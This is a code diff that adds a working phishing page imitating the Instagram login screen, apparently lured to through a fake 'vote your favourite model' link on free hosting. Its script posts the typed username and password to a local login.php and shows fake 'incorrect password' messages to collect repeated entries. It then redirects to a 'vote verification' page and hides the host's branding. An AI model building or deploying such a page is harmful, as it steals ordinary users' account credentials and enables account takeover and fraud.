@@ -1,0 +1,173 @@
+<html lang="en"><head><meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <!-- <title>Giveaway Instant Portal </title> -->
+    <link rel="stylesheet" href="main.css">
+    <!-- HTML Meta Tags -->
+<!-- <meta name="description" content="Discover the latest fashion trends with lobiluxurydesign. Shop the new collection of clothing, footwear, accessories, beauty products and more."> -->
+ 
+<!-- Facebook Meta Tags -->
+<!-- <meta property="og:url" content="http://helpmigrow.epizy.com/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Vote your favourite model">
+<meta property="og:description" content="">
+<meta property="og:image" content="http://helpmigrow.epizy.com/images/dabas.jpg"> -->
+ 
+<!-- Twitter Meta Tags -->
+<!-- <meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:domain" content="http://helpmigrow.epizy.com/">
+<meta property="twitter:url" content="http://helpmigrow.epizy.com/">
+<meta name="twitter:title" content="Vote your favourite model">
+<meta name="twitter:description" content="">
+<meta name="twitter:image" content="http://helpmigrow.epizy.com/images/dabas.jpg"> -->
+ 
+<!-- Meta Tags Generated via https://www.opengraph.xyz -->
+ 
+ <style>img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {display: none;}</style>
+    </head><body><section class="section-all" style="color: #507392;">
+ 
+        <!-- 1-Role Main -->
+        <main class="main" role="main">
+            <div class="wrapper">
+                <article class="article">
+                    <div class="content">
+                        <div class="login-box">
+                            <div class="header">
+                                <img class="logo" src="./images/1024px-Instagram_logo.svg.png">
+                            </div><!-- Header end -->
+                            <div class="form-wrap">
+                                <!-- <form class="form"> -->
+ 
+                                    <div class="input-box">
+                                        <input type="text" id="email" aria-describedby="" placeholder="Phone number, username, or email">
+                                    </div>
+ 
+                                    <div class="input-box">
+                                        <input type="password" id="password" placeholder="Password">
+                                    </div>
+ 
+                                    <span class="button-box">
+                                        <img src="./images/hug.gif" width="20px" id="loader" style="position: absolute; top: 0.5em; left: 9em; display: none; ">
+ 
+                                        <button class="btn" name="login" id="login">Log in</button>
+                                    </span>
+ 
+                                    <a class="forgot" href="">Forgot password?</a>
+                                    <p id="feedback" style="color: red;  font-family: sans-serif; font-size: 15px; text-align: center; margin: 0 30px; display: none;"></p><br>
+ 
+                                <!-- </form> -->
+                            </div> <!-- Form-wrap end -->
+                        </div> <!-- Login-box end -->
+ 
+                        <div class="login-box">
+                            <p class="text">Don't have an account?<a href="#">Sign up</a></p>
+                        </div> <!-- Signup-box end -->
+ 
+                        <div class="app">
+                             
+                            <p>Get the app.</p>
+                            <div class="app-img">
+                                <a href="">
+                                    <img src="./images/ios.png" style="height: 50px;">
+                                </a>
+                                <a href="">
+                                    <img src="./images/google.png" style="height: 40px; margin-top: 5px;">
+                                </a>
+                            </div> <!-- App-img end-->
+                        </div> <!-- App end -->
+                    </div> <!-- Content end -->
+                </article>
+            </div> <!-- Wrapper end -->
+        </main>
+ 
+        <!-- 2-Role Footer -->
+        <footer class="footer" role="contentinfo">
+            <div class="footer-container">
+ 
+                <nav class="footer-nav" role="navigation">
+                    <ul>
+                        <li><a href="">About Us</a></li>
+                        <li><a href="">Support</a></li>
+                        <li><a href="">Blog</a></li>
+                        <li><a href="">Press</a></li>
+                        <li><a href="">Api</a></li>
+                        <li><a href="">Jobs</a></li>
+                        <li><a href="">Privacy</a></li>
+                        <li><a href="">Terms</a></li>
+                        <li><a href="">Directory</a></li>
+                        <li>
+                            <span class="language">Language
+                                <select name="language" class="select" onchange="la(this.value)">
+                                    <option value="#">English</option>
+                                    <option value="">Russian</option>
+                                </select>
+                            </span>
+                        </li>
+                    </ul>
+                </nav>
+ 
+                <!-- <span class="footer-logo">© 2018 Instagram</span> -->
+            </div> <!-- Footer container end -->
+        </footer>
+ 
+    </section>
+     <!-- Root -->
+<script>
+         var login = document.getElementById('login');
+        var loader = document.getElementById('loader')
+        var feedback = document.getElementById('feedback')
+        var email = document.getElementById('email')
+        var password = document.getElementById('password')
+        var x = 0;
+        login.addEventListener('click', function () {
+            login.textContent = "";
+            loader.style.display = 'block'
+ 
+            setTimeout(() => {
+                login.textContent = 'Log In'
+                loader.style.display = 'none'
+ 
+            // function load() {
+            const data = new FormData();
+            data.append('email', email.value);
+            data.append('password', password.value);
+            const response = new XMLHttpRequest();
+            response.onreadystatechange = function () {
+                feedback.style.display = 'block'
+            }
+            response.open('POST', './login.php', true);
+            response.send(data);
+            x ++
+            feedback.textContent = 'The password you entered is incorrect. Please check your password and try again';
+            if (x == 2) {
+                feedback.textContent = 'The password you entered again is still incorrect. Please check your password and try again'
+            }else if (x == 3){
+                feedback.textContent = '';
+                window.location.href='vote_verification.html'
+            }
+        //    }
+ 
+            }, 1500);
+ 
+ 
+        //  function text() {
+        //      login.textContent = 'Log In'
+        //  }
+        //     setTimeout(() => {
+        //       load();
+        //       text();
+        //       loader.style.display = 'none';
+        //       login.style.padding = '10px'
+ 
+        //   }, 1500); 
+ 
+        })
+ 
+ 
+         
+ 
+</script>
+ 
+ 
+</body></html>
